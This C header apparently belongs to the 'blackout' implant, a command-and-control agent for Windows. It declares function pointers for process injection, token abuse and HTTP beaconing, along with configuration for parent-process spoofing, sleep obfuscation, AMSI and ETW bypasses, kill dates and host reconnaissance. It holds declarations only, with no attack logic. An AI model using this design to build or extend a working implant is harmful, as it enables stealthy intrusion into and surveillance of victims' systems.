#ifndef INSTANCE_COMMON_H
#define INSTANCE_COMMON_H

//
// system headers
//
#include <windows.h>
#include <iphlpapi.h>
#include <stdio.h>
//
// blackout headers
//
#include <Native.h>
#include <Macros.h>
#include <BkApi.h>
#include <Utils.h>
#include <Package.h>
#include <Transport.h>

//
// blackout instances
//
EXTERN_C ULONG __Instance_offset;
EXTERN_C PVOID __Instance;

typedef struct _INSTANCE {

    PTEB Teb;

    //
    // base address and size
    // of the implant
    //
    BUFFER Base;

    struct {
        BOOL    (WINAPI *CreateTimerQueueTimer)(PHANDLE phNewTimer, HANDLE TimerQueue, WAITORTIMERCALLBACK Callback, PVOID Parameter, DWORD DueTime, DWORD Period, ULONG Flags);
        HANDLE  (WINAPI *OpenProcess)(DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwProcessId);
        BOOL    (WINAPI *OpenProcessToken)(HANDLE ProcessHandle, DWORD DesiredAccess, PHANDLE TokenHandle);
        HANDLE  (WINAPI *OpenThread)(DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwThreadId);
        BOOL    (WINAPI *OpenThreadToken)(HANDLE ThreadHandle, DWORD DesiredAccess, BOOL OpenAsSelf, PHANDLE TokenHandle);
        BOOL    (WINAPI *CreateProcessA)(LPCSTR lpApplicationName, LPSTR lpCommandLine, LPSECURITY_ATTRIBUTES lpProcessAttributes, LPSECURITY_ATTRIBUTES lpThreadAttributes, BOOL bInheritHandles, DWORD dwCreationFlags, LPVOID lpEnvironment, LPCSTR lpCurrentDirectory, LPSTARTUPINFOA lpStartupInfo, LPPROCESS_INFORMATION lpProcessInformation);
        BOOL    (WINAPI *CreateProcessW)(LPCWSTR lpApplicationName, LPWSTR lpCommandLine, LPSECURITY_ATTRIBUTES lpProcessAttributes, LPSECURITY_ATTRIBUTES lpThreadAttributes, BOOL bInheritHandles, DWORD dwCreationFlags, LPVOID lpEnvironment, LPCWSTR lpCurrentDirectory, LPSTARTUPINFOW lpStartupInfo, LPPROCESS_INFORMATION lpProcessInformation);
        BOOL    (WINAPI *CreateProcessAsUserA)(HANDLE hToken, LPCSTR lpApplicationName, LPSTR lpCommandLine, LPSECURITY_ATTRIBUTES lpProcessAttributes, LPSECURITY_ATTRIBUTES lpThreadAttributes, BOOL bInheritHandles, DWORD dwCreationFlags, LPVOID lpEnvironment, LPCSTR lpCurrentDirectory, LPSTARTUPINFOA lpStartupInfo, LPPROCESS_INFORMATION lpProcessInformation);
        BOOL    (WINAPI *CreateProcessAsUserW)(HANDLE hToken, LPCWSTR lpApplicationName, LPWSTR lpCommandLine, LPSECURITY_ATTRIBUTES lpProcessAttributes, LPSECURITY_ATTRIBUTES lpThreadAttributes, BOOL bInheritHandles, DWORD dwCreationFlags, LPVOID lpEnvironment, LPCWSTR lpCurrentDirectory, LPSTARTUPINFOW lpStartupInfo, LPPROCESS_INFORMATION lpProcessInformation);
        BOOL    (WINAPI *CreateProcessWithLogonW)(LPCWSTR lpUsername, LPCWSTR lpDomain, LPCWSTR lpPassword, DWORD dwLogonFlags, LPCWSTR lpApplicationName, LPWSTR lpCommandLine, DWORD dwCreationFlags, LPVOID lpEnvironment, LPCWSTR lpCurrentDirectory, LPSTARTUPINFOW lpStartupInfo, LPPROCESS_INFORMATION lpProcessInformation);
        BOOL    (WINAPI *CreateProcessWithTokenW)(HANDLE hToken, DWORD dwLogonFlags, LPCWSTR lpApplicationName, LPWSTR lpCommandLine, DWORD dwCreationFlags, LPVOID lpEnvironment, LPCWSTR lpCurrentDirectory, LPSTARTUPINFOW lpStartupInfo, LPPROCESS_INFORMATION lpProcessInformation);
        BOOL    (WINAPI *InitializeProcThreadAttributeList)(LPPROC_THREAD_ATTRIBUTE_LIST lpAttributeList, DWORD dwAttributeCount, DWORD dwFlags, PSIZE_T lpSize);
        BOOL    (WINAPI *UpdateProcThreadAttribute)(LPPROC_THREAD_ATTRIBUTE_LIST lpAttributeList, DWORD dwFlags, DWORD_PTR Attribute, PVOID lpValue, SIZE_T cbSize, PVOID lpPreviousValue, PSIZE_T lpReturnSize);
        BOOL    (WINAPI *WaitForDebugEvent)(LPDEBUG_EVENT lpDebugEvent, DWORD dwMilliseconds);
        BOOL    (WINAPI *WriteProcessMemory)(HANDLE hProcess, LPVOID lpBaseAddress, LPCVOID lpBuffer, SIZE_T nSize, SIZE_T *lpNumberOfBytesWritten);
        BOOL    (WINAPI *DebugActiveProcessStop)(DWORD dwProcessId);
        BOOL    (WINAPI *ContinueDebugEvent)(DWORD dwProcessId, DWORD dwThreadId, DWORD dwContinueStatus);
        BOOL    (WINAPI *CloseHandle)(HANDLE hObject);
        DWORD   (WINAPI *GetLastError)();
        HMODULE (WINAPI *LoadLibraryA)(LPCSTR lpLibFileName);
        HLOCAL  (WINAPI *LocalAlloc)(UINT uFlags, SIZE_T uBytes);
        HLOCAL  (WINAPI *LocalFree)(HLOCAL hMem);
        HLOCAL  (WINAPI *LocalReAlloc)(HLOCAL hMem, SIZE_T uBytes, UINT uFlags);
        BOOL    (WINAPI *VirtualFree)(LPVOID lpAddress, SIZE_T dwSize, DWORD dwFreeType);
        SIZE_T  (WINAPI *VirtualQuery)(LPCVOID lpAddress, PMEMORY_BASIC_INFORMATION lpBuffer, SIZE_T dwLength);
        LPVOID  (WINAPI *VirtualAlloc)(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
        LPVOID  (WINAPI *VirtualAllocEx)(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
        BOOL    (WINAPI *VirtualProtect)(LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect);
        BOOL    (WINAPI *VirtualProtectEx)(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect);
        DWORD   (WINAPI *WaitForSingleObject)(HANDLE hHandle, DWORD dwMilliseconds);
        DWORD   (WINAPI *WaitForSingleObjectEx)(HANDLE hHandle, DWORD dwMilliseconds, BOOL bAlertable);
        HANDLE  (WINAPI *CreateThread)(LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId);
        HANDLE  (WINAPI *CreateRemoteThread)(HANDLE hProcess, LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId);
        DWORD   (WINAPI *QueueUserAPC)(PAPCFUNC pfnAPC, HANDLE hThread, ULONG_PTR dwData);
        FARPROC (WINAPI *GetProcAddress)(HMODULE hModule, LPCSTR lpProcName);
        HMODULE (WINAPI *GetModuleHandleA)(LPCSTR lpModuleName);
        DWORD   (WINAPI *GetTickCount)(void);
        BOOL    (WINAPI *GetComputerNameExA)(COMPUTER_NAME_FORMAT NameType, LPSTR lpBuffer, LPDWORD nSize);
        BOOL    (WINAPI *TerminateProcess)(HANDLE hProcess, UINT uExitCode);
        BOOL    (WINAPI *GetProductInfo)(DWORD dwOSMajorVersion, DWORD dwOSMinorVersion, DWORD dwSpMajorVersion, DWORD dwSpMinorVersion, PDWORD pdwReturnedProductType);
        void    (WINAPI *GetNativeSystemInfo)(LPSYSTEM_INFO lpSystemInfo);

        void     (NTAPI *RtlExitUserProcess)(NTSTATUS ExitStatus);
        void     (NTAPI *RtlExitUserThread)(NTSTATUS ExitStatus);
        PVOID    (NTAPI *RtlAllocateHeap)(PVOID HeapHandle, ULONG Flags, SIZE_T Size);
        PVOID    (NTAPI *RtlCreateHeap)(ULONG Flags, PVOID HeapBase, SIZE_T ReserveSize, SIZE_T CommitSize, PVOID Lock, PRTL_HEAP_PARAMETERS Parameters);
        BOOLEAN  (NTAPI *RtlFreeHeap)(PVOID HeapHandle, ULONG Flags, PVOID BaseAddress);
        PVOID    (NTAPI *RtlReAllocateHeap)(PVOID HeapHandle, ULONG Flags, PVOID BaseAddress, SIZE_T Size);
        NTSTATUS (NTAPI *RtlCreateTimer)(HANDLE TimerQueueHandle, PHANDLE Handle, WAITORTIMERCALLBACKFUNC Function, PVOID Context, ULONG DueTime, ULONG Period, ULONG Flags);
        NTSTATUS (NTAPI *RtlRandomEx)(PULONG Seed);
        NTSTATUS (NTAPI *RtlGetVersion)(PRTL_OSVERSIONINFOW lpVersionInformation);
        NTSTATUS (NTAPI *RtlIpv6StringToAddressA)(PCSTR S, PCSTR* Terminator, PVOID Addr);
        NTSTATUS (NTAPI *NtAllocateVirtualMemory)(HANDLE ProcessHandle, PVOID* BaseAddress, ULONG_PTR ZeroBits, PSIZE_T RegionSize, ULONG AllocationType, ULONG Protect);
        NTSTATUS (NTAPI *NtProtectVirtualMemory)(HANDLE ProcessHandle, PVOID* BaseAddress, PSIZE_T NumberOfBytesToProtect, ULONG NewAccessProtection, PULONG OldAccessProtection);
        NTSTATUS (NTAPI *NtCreateThreadEx)(PHANDLE ThreadHandle, ACCESS_MASK DesiredAccess, PVOID ObjectAttributes, HANDLE ProcessHandle, PVOID StartRoutine, PVOID Argument, ULONG CreateFlags, ULONG_PTR ZeroBits, SIZE_T StackSize, SIZE_T MaximumStackSize, PVOID AttributeList);
        NTSTATUS (NTAPI *LdrLoadDll)(PWCHAR PathToFile, ULONG Flags, PUNICODE_STRING ModuleFileName, PHANDLE ModuleHandle);
        NTSTATUS (NTAPI *NtQuerySystemInformation)(SYSTEM_INFORMATION_CLASS SystemInformationClass, PVOID SystemInformation, ULONG SystemInformationLength, PULONG ReturnLength);
        NTSTATUS (NTAPI *NtQueryInformationProcess)(HANDLE ProcessHandle, PROCESSINFOCLASS ProcessInformationClass, PVOID ProcessInformation, ULONG ProcessInformationLength, PULONG ReturnLength);
        NTSTATUS (NTAPI *NtSetInformationVirtualMemory)(HANDLE ProcessHandle, VIRTUAL_MEMORY_INFORMATION_CLASS VmInformationClass, ULONG_PTR NumberOfEntries, PMEMORY_RANGE_ENTRY VirtualAddresses, PVOID VmInformation, ULONG VmInformationLength);
        NTSTATUS (NTAPI *NtOpenProcess)(PHANDLE ProcessHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, PCLIENT_ID ClientId);
        NTSTATUS (NTAPI *NtWaitForSingleObject)(HANDLE Handle, BOOLEAN Alertable, PLARGE_INTEGER Timeout);
        NTSTATUS (NTAPI *NtSignalAndWaitForSingleObject)(HANDLE SignalHandle, HANDLE WaitHandle, BOOLEAN Alertable, PLARGE_INTEGER Timeout);
        NTSTATUS (NTAPI *NtTestAlert)(void);
        NTSTATUS (NTAPI *NtQueueApcThread)(HANDLE ThreadHandle, PPS_APC_ROUTINE ApcRoutine, PVOID ApcArgument1, PVOID ApcArgument2, PVOID ApcArgument3);
        NTSTATUS (NTAPI *NtGetContextThread)(HANDLE ThreadHandle, PCONTEXT ThreadContext);
        NTSTATUS (NTAPI *NtSetContextThread)( HANDLE ThreadHandle, PCONTEXT ThreadContext );
        NTSTATUS (NTAPI *NtAlertResumeThread)(HANDLE ThreadHandle, PULONG PreviousSuspendCount);
        NTSTATUS (NTAPI *NtCreateEvent)(PHANDLE EventHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, EVENT_TYPE EventType, BOOLEAN InitialState);
        NTSTATUS (NTAPI *NtContinue)(PCONTEXT ContextRecord, BOOLEAN TestAlert);
        NTSTATUS (NTAPI *NtClose)(HANDLE Handle);
        NTSTATUS (NTAPI *NtTerminateProcess)(HANDLE ProcessHandle, NTSTATUS ExitStatus);

        BOOL      (WINAPI *GetUserNameA)(LPSTR lpBuffer, LPDWORD pcbBuffer);
        NTSTATUS  (NTAPI *SystemFunction032)(struct USTRING* Img, struct USTRING* Key);

        PVOID SystemFunction040;
        PVOID SystemFunction041;

        HINTERNET (*WinHttpOpen)(LPCWSTR pszAgentW, DWORD dwAccessType, LPCWSTR pszProxyW, LPCWSTR pszProxyBypassW, DWORD dwFlags);
        HINTERNET (*WinHttpConnect)(HINTERNET hSession, LPCWSTR pswzServerName, INTERNET_PORT nServerPort, DWORD dwReserved);
        HINTERNET (*WinHttpOpenRequest)(HINTERNET hConnect, LPCWSTR pwszVerb, LPCWSTR pwszObjectName, LPCWSTR pwszVersion, LPCWSTR pwszReferrer, LPCWSTR *ppwszAcceptTypes, DWORD dwFlags);
        BOOL      (*WinHttpReceiveResponse)(HINTERNET hRequest, LPVOID lpReserved);
        BOOL      (*WinHttpSendRequest)(HINTERNET hRequest, LPCWSTR pwszHeaders, DWORD dwHeadersLength, LPVOID lpOptional, DWORD dwOptionalLength, DWORD dwTotalLength, DWORD_PTR dwContext);
        BOOL      (*WinHttpReadData)(HINTERNET hRequest, LPVOID lpBuffer, DWORD dwNumberOfBytesToRead, LPDWORD lpdwNumberOfBytesRead);
        BOOL      (*WinHttpSetOption)(HINTERNET hInternet, DWORD dwOption, LPVOID lpBuffer, DWORD dwBufferLength);
        BOOL      (*WinHttpCloseHandle)(HINTERNET hInternet);

        D_API( printf );

        ULONG (*GetAdaptersInfo)( PIP_ADAPTER_INFO AdapterInfo, PULONG SizePointer );
    } Win32;

    struct {
        PVOID Ntdll;
        PVOID Kernelbase;
        PVOID Kernel32;
        PVOID Winhttp;
        PVOID Advapi32;
        PVOID Msvcrt;
        PVOID User32;
        PVOID Iphlpapi;
        PVOID Cryptbase;
        PVOID Cryptsp;
    } Modules;

    struct {
        struct {
            PSTR  Spawnto;
            DWORD Ppid;
            BOOL  Blockdlls;
            PWSTR Argue;            
        } Fork;

        struct {   
            LPWSTR   UserAgent;
            LPWSTR   Host;
            DWORD    Port;
            PPACKAGE Package;
            BOOL     Secure;
        } TransportWeb;
        
        struct {
            DWORD  AgentId;
            DWORD  ProcessArch;
            BOOL   Elevated;
            BOOL   Connected;
            PWSTR  ProcessName;
            PWSTR  ProcessFullPath;
            PWSTR  ProcessCmdLine;
            DWORD  ParentProcId;
            DWORD  ProcessId;
            DWORD  ThreadId;
            PVOID  Heap;
            BOOL   Ntapi;
            DWORD  SleepObf;
            DWORD  SleepTime;
            DWORD  Jitter;
            BOOL   AmsiBypass;
            BOOL   EtwBypass;
            UINT64 KillDate;
            UINT32 WorkingHours;
        } Session;

        struct {
            CHAR  UserName[MAX_PATH];
            CHAR  DomainName[MAX_PATH];
            CHAR  ComputerName[MAX_PATH];
            CHAR  NetBios[MAX_PATH];
            WORD  OsArch;
            DWORD OsMajorV;
            DWORD OsMinorv;
            WORD  OsBuildNumber;
            DWORD ProcessorType;
            DWORD ProductType;
            PSTR  IpAddress;
        } CompData;

    } Config;

} INSTANCE, *PINSTANCE;

EXTERN_C PVOID StRipStart();
EXTERN_C PVOID StRipEnd();

#endif //INSTANCE_COMMON_H
